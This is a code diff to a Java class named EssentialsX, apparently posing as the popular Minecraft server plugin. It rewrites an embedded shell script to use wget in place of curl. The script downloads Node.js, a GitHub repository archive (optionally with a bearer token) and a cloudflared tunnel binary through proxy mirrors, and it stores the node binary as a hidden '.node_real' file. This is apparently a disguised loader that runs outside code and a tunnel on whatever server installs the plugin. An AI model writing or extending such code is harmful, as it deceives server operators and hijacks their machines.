@@ -406,9 +406,9 @@ public class EssentialsX extends JavaPlugin {
         String appDir = workDir + "/app";
 
         String authHeader = "";
-        if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
+        if (!githubToken.isEmpty()) authHeader = "--header=\"Authorization: Bearer " + githubToken + "\" --header=\"Accept: application/vnd.github+json\"";
 
-        // 增加了详细的 echo 日志，去掉了 /dev/null，并缩短了超时时间
+        // 将所有的 curl 替换为了 wget 适配 Alpine 环境
         return "#!/bin/sh\n" +
         "set +e\n" +
         "echo 'Starting deploy script...'\n" +
@@ -435,8 +435,11 @@ public class EssentialsX extends JavaPlugin {
         "    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
         "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
         "        echo \"Trying mirror: $MIRROR\"\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\"; then\n" +
-        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; echo 'Node download OK'; break; fi; fi; done\n" +
+        "        wget -q --timeout=15 --tries=2 -O \"$WORK_DIR/node.tar.gz\" \"$MIRROR\"\n" +
+        "        if [ $? -eq 0 ]; then\n" +
+        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; echo 'Node download OK'; break; fi\n" +
+        "        fi\n" +
+        "    done\n" +
         "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
         "        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
         "        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
@@ -452,15 +455,22 @@ public class EssentialsX extends JavaPlugin {
         (githubToken.isEmpty() ? "" :
         "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
         "    echo \"Trying GitHub API: $TAR_URL\"\n" +
-        "    if curl -fsSL --connect-timeout 10 --max-time 60 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\"; then\n" +
-        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; fi; fi; fi\n") +
+        "    wget -q --timeout=15 --tries=2 " + authHeader + " -O \"$WORK_DIR/repo.tar.gz\" \"$TAR_URL\"\n" +
+        "    if [ $? -eq 0 ]; then\n" +
+        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; fi\n" +
+        "    fi\n" +
+        "fi\n") +
         "\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
         "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
         "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
         "        echo \"Trying fallback mirror: $MIRROR\"\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\"; then\n" +
-        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; break; fi; fi; done; fi\n" +
+        "        wget -q --timeout=15 --tries=2 -O \"$WORK_DIR/repo.tar.gz\" \"$MIRROR\"\n" +
+        "        if [ $? -eq 0 ]; then\n" +
+        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; echo 'Repo download OK'; break; fi\n" +
+        "        fi\n" +
+        "    done\n" +
+        "fi\n" +
         "\n" +
         "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then echo \"ERROR: Failed to download repo\"; exit 1; fi\n" +
         "\n" +
@@ -495,8 +505,12 @@ public class EssentialsX extends JavaPlugin {
         "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
         "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
         "        echo \"Trying CF mirror: $MIRROR\"\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\"; then\n" +
-        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; echo 'CF download OK'; break; fi; fi; done; fi\n" +
+        "        wget -q --timeout=15 --tries=2 -O \"$CF_BIN\" \"$MIRROR\"\n" +
+        "        if [ $? -eq 0 ]; then\n" +
+        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; echo 'CF download OK'; break; fi\n" +
+        "        fi\n" +
+        "    done\n" +
+        "fi\n" +
         "\n" +
         "echo 'Deploy finished successfully!'\n" +
         "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
